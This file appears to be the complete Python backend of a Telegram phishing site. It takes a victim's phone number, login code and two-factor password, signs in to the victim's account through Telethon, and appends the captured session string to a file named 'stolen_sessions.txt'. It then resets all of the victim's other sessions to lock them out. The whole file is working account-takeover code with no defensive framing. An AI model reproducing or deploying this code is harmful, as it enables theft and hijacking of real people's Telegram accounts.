from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import os, datetime, uvicorn

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

API_ID = int(os.environ.get("TG_API_ID", "0"))
API_HASH = os.environ.get("TG_API_HASH", "")

clients = {}           
hashes = {}            
verified_sessions = {} 

KICK_SESSIONS = True  

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/send_code")
async def send_code(req: Request):
    data = await req.json()
    phone = data.get("phone", "").strip()

    if not phone:
        return {"ok": False, "error": "Введите номер"}
    
    if phone in clients:
        return {"ok": True, "code_hash": hashes.get(phone)}

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        clients[phone] = client
        hashes[phone] = sent.phone_code_hash
        return {"ok": True, "code_hash": sent.phone_code_hash}
    except Exception as e:
        await client.disconnect()
        return {"ok": False, "error": str(e)}

@app.post("/api/verify")
async def verify(req: Request):
    data = await req.json()
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    code_hash = data.get("code_hash", "")
    password = data.get("password", None)

    if phone in verified_sessions:
        return {"ok": True, "kicked": False, "msg": "Уже авторизован"}

    client = clients.get(phone)
    if not client:
        return {"ok": False, "error": "Сессия устарела. Запросите код заново."}

    try:
        await client.sign_in(phone, code, phone_code_hash=code_hash)
    except SessionPasswordNeededError:
        if not password:
            return {"ok": False, "error": "2FA_REQUIRED"}
        try:
            await client.sign_in(password=password)
        except Exception:
            return {"ok": False, "error": "INVALID_2FA"}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"ok": False, "error": "Неверный или просроченный код"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

    session_str = client.session.save()
    verified_sessions[phone] = session_str

    with open("stolen_sessions.txt", "a", encoding="utf-8") as f:
        f.write(f"{datetime.datetime.utcnow().isoformat()} | {phone} | {session_str}\n")

    kicked = False
    if KICK_SESSIONS:
        try:
            await client(ResetAuthorizationsRequest())
            kicked = True
        except Exception:
            pass

    await client.disconnect()
    del clients[phone]
    del hashes[phone]

    return {"ok": True, "kicked": kicked}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=10000)
